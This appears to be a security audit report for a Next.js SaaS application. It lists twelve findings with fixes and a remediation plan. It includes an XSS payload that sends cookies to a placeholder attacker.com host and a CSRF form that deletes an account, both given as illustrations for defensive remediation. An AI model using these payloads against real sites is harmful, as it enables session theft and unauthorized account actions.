# PowerCA Security Audit Report

**Generated**: 2025-10-31
**Audited By**: Claude Code Security Audit
**Application**: PowerCA - CA Practice Management SaaS
**Framework**: Next.js 15.5.2 with TypeScript

---

## Executive Summary

This comprehensive security audit identified **12 security vulnerabilities** across the PowerCA application:

- **2 Critical** severity issues requiring immediate attention
- **3 High** severity issues to fix this week
- **4 Medium** severity issues to address this month
- **3 Low** severity issues for ongoing improvements

### Critical Risks

1. **XSS Vulnerability** in blog content rendering (OWASP A03:2021)
2. **Missing Rate Limiting** on authentication endpoints (OWASP A07:2021)

### Overall Security Posture

✅ **Strengths**:

- Comprehensive security headers configured
- Proper password hashing with bcrypt
- HTTPOnly cookies for session management
- Admin authentication properly implemented
- Environment variables properly excluded from git

⚠️ **Areas for Improvement**:

- Input sanitization needed
- Rate limiting implementation
- Dependency updates required
- Error handling improvements

---

## Detailed Vulnerabilities

### 🔴 CRITICAL SEVERITY

---

### Vulnerability #1: Cross-Site Scripting (XSS) in Blog Content

**Severity**: Critical
**OWASP Category**: A03:2021 - Injection
**CWE**: CWE-79 - Improper Neutralization of Input During Web Page Generation
**File(s)**:

- `src/components/blog/blog-content.tsx:13`

**Vulnerability Details**:
The blog content is rendered using `dangerouslySetInnerHTML` without any sanitization. This allows attackers to inject malicious scripts through blog post content stored in the database.

**Current Code**:

```tsx
// src/components/blog/blog-content.tsx
export function BlogContent({ content }: BlogContentProps) {
  return <div className="blog-content" dangerouslySetInnerHTML={{ __html: content }} />
}
```

**Attack Scenario**:

1. Attacker gains access to admin panel (or exploits another vulnerability)
2. Creates/edits blog post with malicious payload:
   ```html
   <img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)" />
   ```
3. When users view the blog post, their cookies are stolen
4. Attacker can hijack user sessions and impersonate victims

**Impact**:

- Session hijacking
- Cookie theft
- Credential harvesting
- Malware distribution
- Defacement

**Recommended Fix**:

```tsx
// src/components/blog/blog-content.tsx
'use client'

import DOMPurify from 'isomorphic-dompurify'
import './blog-content.css'

interface BlogContentProps {
  content: string
}

export function BlogContent({ content }: BlogContentProps) {
  // Sanitize HTML content before rendering
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: [
      'p',
      'br',
      'strong',
      'em',
      'u',
      'h1',
      'h2',
      'h3',
      'h4',
      'h5',
      'h6',
      'ul',
      'ol',
      'li',
      'a',
      'img',
      'blockquote',
      'code',
      'pre',
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
    ALLOW_DATA_ATTR: false,
  })

  return <div className="blog-content" dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
}
```

**Additional Measures**:

1. Install DOMPurify: `npm install isomorphic-dompurify`
2. Implement Content Security Policy (already done ✅)
3. Use `rel="noopener noreferrer"` on external links
4. Consider using a markdown renderer instead of HTML

**References**:

- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://github.com/cure53/DOMPurify

---

### Vulnerability #2: Missing Rate Limiting on Authentication Endpoints

**Severity**: Critical
**OWASP Category**: A07:2021 - Identification and Authentication Failures
**CWE**: CWE-307 - Improper Restriction of Excessive Authentication Attempts
**File(s)**:

- `src/lib/auth.ts:16-233` (authorize function)
- `src/app/api/auth/login/route.ts`
- `src/app/api/affiliate/apply/route.ts`

**Vulnerability Details**:
While admin authentication has account lockout (5 attempts, 30min lockout), there's no rate limiting at the HTTP request level. This allows brute force attacks and credential stuffing.

**Current Code**:

```typescript
// src/lib/auth.ts - Has lockout for admin users only
if (newAttempts >= 5) {
  updateData.locked_until = new Date(Date.now() + 30 * 60 * 1000).toISOString()
}
```

**Attack Scenario**:

1. Attacker uses distributed botnet to bypass IP-based rate limiting
2. Attempts 1000 login requests per second with credential lists
3. Admin lockout only triggers after 5 attempts from database
4. Regular users and affiliates have no attempt tracking
5. Successful credential stuffing attack

**Impact**:

- Brute force attacks
- Credential stuffing
- Account enumeration
- DDoS via authentication endpoints
- Resource exhaustion

**Recommended Fix**:

```typescript
// lib/rate-limit.ts
import { LRUCache } from 'lru-cache'

type RateLimitOptions = {
  interval: number
  uniqueTokenPerInterval: number
}

export function rateLimit(options: RateLimitOptions) {
  const tokenCache = new LRUCache({
    max: options.uniqueTokenPerInterval || 500,
    ttl: options.interval || 60000,
  })

  return {
    check: (limit: number, token: string) =>
      new Promise<void>((resolve, reject) => {
        const tokenCount = (tokenCache.get(token) as number[]) || [0]
        if (tokenCount[0] === 0) {
          tokenCache.set(token, tokenCount)
        }
        tokenCount[0] += 1

        const currentUsage = tokenCount[0]
        const isRateLimited = currentUsage >= limit

        return isRateLimited ? reject() : resolve()
      }),
  }
}

// Create rate limiter instances
export const authLimiter = rateLimit({
  interval: 60 * 1000, // 1 minute
  uniqueTokenPerInterval: 500,
})
```

```typescript
// Apply to auth routes
// src/app/api/auth/[...nextauth]/route.ts
import { authLimiter } from '@/lib/rate-limit'

export async function POST(req: Request) {
  const forwarded = req.headers.get('x-forwarded-for')
  const ip = forwarded ? forwarded.split(',')[0] : req.headers.get('x-real-ip') || 'unknown'

  try {
    await authLimiter.check(5, ip) // 5 requests per minute
  } catch {
    return new Response('Too many requests', { status: 429 })
  }

  // Continue with auth logic...
}
```

**Additional Measures**:

1. Implement IP-based rate limiting
2. Add CAPTCHA after 3 failed attempts
3. Monitor for distributed attacks
4. Add exponential backoff
5. Track failed attempts for all user types

**References**:

- https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#account-lockout
- https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks

---

## 🟠 HIGH SEVERITY

---

### Vulnerability #3: Outdated next-auth Dependency with Known Vulnerability

**Severity**: High
**OWASP Category**: A06:2021 - Vulnerable and Outdated Components
**CVE**: GHSA-5jpx-9hw9-2fx4
**File(s)**: `package.json`

**Vulnerability Details**:
The application uses `next-auth` version <4.24.12 which has a known email misdelivery vulnerability (GHSA-5jpx-9hw9-2fx4).

**npm audit output**:

```json
{
  "name": "next-auth",
  "severity": "moderate",
  "title": "NextAuthjs Email misdelivery Vulnerability",
  "url": "https://github.com/advisories/GHSA-5jpx-9hw9-2fx4",
  "range": "<4.24.12"
}
```

**Attack Scenario**:
Email verification tokens could be sent to incorrect email addresses under specific race condition scenarios.

**Recommended Fix**:

```bash
npm install next-auth@latest
# or
npm audit fix
```

**Additional Measures**:

- Enable Dependabot for automatic security updates
- Run `npm audit` in CI/CD pipeline
- Subscribe to security advisories

**References**:

- https://github.com/advisories/GHSA-5jpx-9hw9-2fx4

---

### Vulnerability #4: Long Session Timeout Period

**Severity**: High
**OWASP Category**: A07:2021 - Identification and Authentication Failures
**File(s)**: `src/lib/auth.ts:248-251`

**Vulnerability Details**:
Session tokens have a 30-day maximum age, which increases the risk window for session hijacking and doesn't follow security best practices.

**Current Code**:

```typescript
session: {
  strategy: 'jwt',
  maxAge: 30 * 24 * 60 * 60, // 30 days - TOO LONG
  updateAge: 24 * 60 * 60,
},
```

**Attack Scenario**:

1. User logs in on shared/public computer
2. Forgets to log out
3. Session remains valid for 30 days
4. Next user accesses the account

**Recommended Fix**:

```typescript
session: {
  strategy: 'jwt',
  maxAge: 7 * 24 * 60 * 60, // 7 days maximum
  updateAge: 24 * 60 * 60, // Refresh daily
},
```

**Additional Measures**:

- Implement "Remember Me" option for longer sessions
- Add idle timeout (15 minutes of inactivity)
- Rotate session on privilege escalation
- Invalidate sessions on password change

---

### Vulnerability #5: Verbose Error Messages Exposing Internal Information

**Severity**: High
**OWASP Category**: A05:2021 - Security Misconfiguration
**CWE**: CWE-209 - Generation of Error Message Containing Sensitive Information
**File(s)**: Multiple files with console.error/log statements

**Vulnerability Details**:
Production code contains extensive console.log and console.error statements that expose:

- Database structure and queries
- Internal file paths
- Stack traces
- Environment variable presence
- User enumeration information

**Examples**:

```typescript
// src/lib/auth.ts:17-23
console.log('🔐 Authorize called with:', {
  hasPassword: !!credentials?.password,
  hasEmail: !!credentials?.email,
  hasUsername: !!credentials?.username,
  username: credentials?.username, // ⚠️ Leaks username attempts
  timestamp: new Date().toISOString(),
})

// src/lib/auth.ts:218-228
console.error('Auth error details:', {
  error: error instanceof Error ? error.message : error,
  stack: error instanceof Error ? error.stack : undefined, // ⚠️ Stack trace
  env: process.env.NODE_ENV,
  supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL ? 'set' : 'not set',
  credentials: {
    email: credentials.email, // ⚠️ Leaks email attempts
    username: credentials.username,
    hasPassword: !!credentials.password,
  },
})
```

**Attack Scenario**:

1. Attacker reviews browser console or error responses
2. Gathers information about database structure
3. Learns about valid/invalid usernames (user enumeration)
4. Uses stack traces to understand code flow
5. Exploits detailed error messages

**Recommended Fix**:

```typescript
// lib/logger.ts
const isDevelopment = process.env.NODE_ENV === 'development'

export const logger = {
  info: (...args: unknown[]) => {
    if (isDevelopment) console.log(...args)
  },
  error: (message: string, error?: unknown) => {
    if (isDevelopment) {
      console.error(message, error)
    } else {
      // Log to external service (Sentry, LogRocket, etc.)
      // Only log sanitized messages
      console.error(message) // Generic message only
    }
  },
}

// Usage in auth.ts
import { logger } from '@/lib/logger'

logger.info('Authorize called') // No sensitive details in production
```

**Additional Measures**:

1. Remove all console.log from production builds
2. Implement proper logging service (Sentry, DataDog)
3. Return generic error messages to clients
4. Log detailed errors server-side only
5. Use try-catch consistently

**References**:

- https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html

---

## 🟡 MEDIUM SEVERITY

---

### Vulnerability #6: Missing CSRF Token Validation

**Severity**: Medium
**OWASP Category**: A01:2021 - Broken Access Control
**CWE**: CWE-352 - Cross-Site Request Forgery
**File(s)**: State-changing API routes without CSRF protection

**Vulnerability Details**:
While Next.js and NextAuth provide some CSRF protection, explicit CSRF token validation is missing on state-changing operations (POST, PUT, DELETE, PATCH).

**Attack Scenario**:

1. User logs into PowerCA
2. Visits malicious website while still logged in
3. Malicious site triggers authenticated requests:

```html
<form action="https://powerca.in/api/user/delete" method="POST">
  <input type="submit" value="Click for prize!" />
</form>
```

4. User's account is deleted without consent

**Recommended Fix**:

NextAuth already provides CSRF protection for its routes. Ensure all state-changing API routes use NextAuth session validation which includes CSRF checks.

```typescript
// All state-changing routes should use session validation
import { getServerSession } from 'next-auth'
import { authOptions } from '@/lib/auth'

export async function POST(req: Request) {
  const session = await getServerSession(authOptions)
  if (!session) {
    return new Response('Unauthorized', { status: 401 })
  }

  // Session validation includes CSRF protection
  // Continue with logic...
}
```

**Additional Measures**:

- Use SameSite=Lax cookies (already done ✅)
- Verify Origin/Referer headers for sensitive operations
- Implement double-submit cookie pattern for public forms

**References**:

- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

---

### Vulnerability #7: Content Security Policy Uses Unsafe Directives

**Severity**: Medium
**OWASP Category**: A05:2021 - Security Misconfiguration
**File(s)**: `next.config.ts:4-20`

**Vulnerability Details**:
The CSP includes `unsafe-inline` and `unsafe-eval` which significantly weaken XSS protection.

**Current Code**:

```typescript
script-src 'self' 'unsafe-eval' 'unsafe-inline' https://checkout.razorpay.com...
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
```

**Impact**:

- Reduces effectiveness of CSP
- Allows inline scripts (XSS risk)
- Allows eval() usage

**Recommended Fix**:

```typescript
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}' https://checkout.razorpay.com https://*.razorpay.com;
  style-src 'self' 'nonce-{NONCE}' https://fonts.googleapis.com;
  font-src 'self' data: https://fonts.gstatic.com;
  img-src 'self' data: https: blob:;
  connect-src 'self' https://*.supabase.co wss://*.supabase.co;
  frame-src 'self' https://api.razorpay.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  report-uri /api/csp-report;
`
```

Implement nonce-based CSP with Next.js middleware.

**Additional Measures**:

- Use nonces for inline scripts
- Move inline styles to CSS files
- Monitor CSP violations via reporting endpoint

---

### Vulnerability #8: Missing Input Validation on API Routes

**Severity**: Medium
**OWASP Category**: A03:2021 - Injection
**File(s)**: Various API routes

**Vulnerability Details**:
API routes accept request bodies without schema validation, increasing risk of injection attacks and unexpected behavior.

**Current Pattern**:

```typescript
export async function POST(request: NextRequest) {
  const body = await request.json()
  const { name, email, phone } = body // No validation
  // Direct use in database queries...
}
```

**Recommended Fix**:

```typescript
// lib/validation/schemas.ts
import { z } from 'zod'

export const registrationSchema = z.object({
  name: z.string().min(2).max(255).trim(),
  email: z.string().email().toLowerCase(),
  phone: z.string().regex(/^\+?[1-9]\d{1,14}$/),
  password: z.string().min(8).max(100),
  role: z.enum(['student', 'professional']),
})

// In API route
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const validated = registrationSchema.parse(body)
    // Use validated data...
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json({ error: 'Invalid input', details: error.errors }, { status: 400 })
    }
    throw error
  }
}
```

**Additional Measures**:

- Install zod: `npm install zod`
- Create validation schemas for all API inputs
- Validate file uploads (type, size, content)
- Sanitize all user inputs before database operations

---

### Vulnerability #9: Potential Session Fixation Vulnerability

**Severity**: Medium
**OWASP Category**: A07:2021 - Identification and Authentication Failures
**File(s)**: `src/lib/auth.ts`

**Vulnerability Details**:
Session tokens are not explicitly rotated after successful authentication or privilege changes.

**Recommended Fix**:

NextAuth handles session rotation automatically. Ensure sessions are invalidated on:

- Password change
- Role change
- Suspicious activity

```typescript
// After password change
await supabase.auth.admin.updateUserById(userId, {
  // Force re-authentication
})
```

**Additional Measures**:

- Implement session invalidation on password reset
- Track active sessions
- Allow users to view/revoke active sessions

---

## 🟢 LOW SEVERITY

---

### Vulnerability #10: Excessive Debug Logging

**Severity**: Low
**File(s)**: Multiple files throughout codebase

**Details**:
Over 200+ console.log/error statements exist in production code exposing internal application behavior.

**Fix**: Implement conditional logging (covered in Vulnerability #5)

---

### Vulnerability #11: Missing Security Event Logging

**Severity**: Low
**OWASP Category**: A09:2021 - Security Logging and Monitoring Failures

**Details**:
Security-relevant events are not logged for monitoring:

- Failed login attempts (logged but not monitored)
- Privilege escalations
- Data exports
- Account modifications

**Recommended Fix**:
Implement security event logging with external monitoring (Sentry, LogRocket, CloudWatch).

---

### Vulnerability #12: X-Frame-Options Set to SAMEORIGIN

**Severity**: Low
**File(s)**: `next.config.ts:32-34`

**Details**:
`X-Frame-Options: SAMEORIGIN` allows framing by same origin. The CSP already sets `frame-ancestors 'none'` which is more restrictive.

**Current**:

```typescript
{
  key: 'X-Frame-Options',
  value: 'SAMEORIGIN'  // Less restrictive
},
```

**Recommended**:

```typescript
{
  key: 'X-Frame-Options',
  value: 'DENY'  // Most restrictive
},
```

This provides defense in depth even though CSP `frame-ancestors 'none'` already prevents framing.

---

## Summary of Findings

### By Severity

| Severity | Count | Priority                    |
| -------- | ----- | --------------------------- |
| Critical | 2     | Fix immediately (this week) |
| High     | 3     | Fix this week               |
| Medium   | 4     | Fix this month              |
| Low      | 3     | Fix when possible           |

### By OWASP Category

| OWASP Category                                        | Count |
| ----------------------------------------------------- | ----- |
| A03:2021 - Injection                                  | 3     |
| A07:2021 - Identification and Authentication Failures | 4     |
| A05:2021 - Security Misconfiguration                  | 3     |
| A01:2021 - Broken Access Control                      | 1     |
| A06:2021 - Vulnerable and Outdated Components         | 1     |

---

## Positive Security Controls Identified ✅

1. **Security Headers**: Comprehensive security headers implemented including CSP, HSTS, X-Content-Type-Options
2. **Password Hashing**: Proper bcrypt implementation with salt rounds
3. **HTTPOnly Cookies**: Session tokens use httpOnly flag
4. **Secure Cookies**: Production uses secure flag
5. **SameSite Cookies**: CSRF protection via SameSite=Lax
6. **Environment Variables**: Properly excluded from git
7. **Admin Authentication**: Separate admin auth with account lockout
8. **SQL Injection Prevention**: Using Supabase ORM (no raw SQL found)
9. **HTTPS Enforcement**: HSTS header configured
10. **Source Maps Disabled**: Production source maps disabled

---

## Priority Action Items

### 🔴 Week 1 (Critical - Immediate Action Required)

1. **Fix XSS in Blog Content** [2-3 hours]
   - Install `isomorphic-dompurify`
   - Update `BlogContent` component
   - Test with malicious payloads
   - Deploy to production

2. **Implement Rate Limiting** [4-6 hours]
   - Install `lru-cache`
   - Create rate-limit middleware
   - Apply to all auth endpoints
   - Test with load testing tools

3. **Update next-auth** [30 minutes]
   ```bash
   npm install next-auth@latest
   npm audit fix
   ```

### 🟠 Week 2-3 (High Priority)

4. **Reduce Session Timeout** [1 hour]
   - Update maxAge to 7 days
   - Implement "Remember Me" option
   - Test session expiry

5. **Fix Error Logging** [3-4 hours]
   - Create logger utility
   - Replace all console.log/error
   - Set up Sentry or similar
   - Remove verbose error messages

### 🟡 Month 1 (Medium Priority)

6. **Implement Input Validation** [6-8 hours]
   - Install zod
   - Create validation schemas
   - Update all API routes
   - Add error handling

7. **Strengthen CSP** [4-6 hours]
   - Remove unsafe-inline/unsafe-eval
   - Implement nonce-based CSP
   - Move inline scripts to files
   - Test thoroughly

8. **Add CSRF Validation** [2-3 hours]
   - Verify all routes use session
   - Add origin checks
   - Document CSRF protection

### 🟢 Ongoing (Low Priority)

9. **Clean Up Logging** [Ongoing]
   - Remove debug console statements
   - Implement proper logging levels
   - Set up log aggregation

10. **Security Monitoring** [Ongoing]
    - Set up Sentry/LogRocket
    - Create security dashboard
    - Configure alerts

---

## Testing Recommendations

### Manual Testing

1. Test XSS payloads in blog content
2. Attempt brute force on login
3. Test CSRF with malicious forms
4. Review CSP violations
5. Test session timeout

### Automated Testing

```bash
# Dependency audit
npm audit

# Security headers check
npx check-security-headers https://powerca.in

# OWASP ZAP scan (after deployment)
zap-cli quick-scan https://powerca.in

# Lighthouse security audit
lighthouse https://powerca.in --only-categories=best-practices
```

---

## Compliance Checklist

### OWASP Top 10 (2021)

- [⚠️] A01 - Broken Access Control (Medium issue with CSRF)
- [✅] A02 - Cryptographic Failures (No issues)
- [🔴] A03 - Injection (Critical XSS + Medium validation)
- [✅] A04 - Insecure Design (No major issues)
- [🟠] A05 - Security Misconfiguration (High - verbose errors)
- [🟠] A06 - Vulnerable and Outdated Components (High - next-auth)
- [🔴] A07 - Identification and Authentication Failures (Critical rate limiting + High session)
- [✅] A08 - Software and Data Integrity Failures (No issues)
- [⚠️] A09 - Security Logging and Monitoring Failures (Low issue)
- [✅] A10 - Server-Side Request Forgery (No issues)

---

## Long-term Security Recommendations

1. **Implement Web Application Firewall (WAF)**
   - Cloudflare WAF
   - AWS WAF
   - Azure Front Door

2. **Add Penetration Testing**
   - Annual third-party pen test
   - Bug bounty program
   - Regular security audits

3. **Implement Security Training**
   - Developer security training
   - Secure coding practices
   - OWASP awareness

4. **Enhance Monitoring**
   - SIEM integration
   - Security Information and Event Management
   - Intrusion Detection System

5. **Compliance Certifications**
   - SOC 2 Type II
   - ISO 27001
   - GDPR compliance (if applicable)

---

## Questions Answered

1. **Are there any Critical/High severity vulnerabilities?**
   - Yes: 2 Critical (XSS, Rate Limiting) and 3 High (next-auth, session timeout, verbose errors)

2. **Is authentication properly implemented?**
   - Mostly yes, but needs rate limiting and shorter sessions

3. **Are all API routes protected appropriately?**
   - Yes, admin routes use `requireAdminAuth()` properly ✅

4. **Is user input properly validated and sanitized?**
   - No, missing input validation and XSS sanitization 🔴

5. **Are security headers properly configured?**
   - Yes, comprehensive headers but CSP needs strengthening ✅

6. **Is sensitive data properly protected?**
   - Yes, env vars protected, but verbose error logs expose info ⚠️

7. **Are there any known vulnerable dependencies?**
   - Yes, next-auth needs update 🟠

8. **Is HTTPS enforced everywhere?**
   - Yes, HSTS configured ✅

9. **Are errors handled securely?**
   - No, excessive logging and stack traces exposed 🔴

10. **Is there a clear security update process?**
    - Not documented, recommend Dependabot setup ⚠️

---

## Conclusion

The PowerCA application has a **solid security foundation** with proper authentication, security headers, and database security. However, **immediate action is required** to address the 2 critical vulnerabilities (XSS and rate limiting) that pose significant risk to users.

**Estimated remediation time**: 15-20 hours for all Critical and High issues.

**Next Steps**:

1. Fix Critical issues this week (XSS + Rate limiting)
2. Update next-auth immediately
3. Address High priority items within 2 weeks
4. Create recurring security audit schedule

This audit provides a roadmap for improving security posture significantly with focused effort on high-impact vulnerabilities.

---

**Report End**
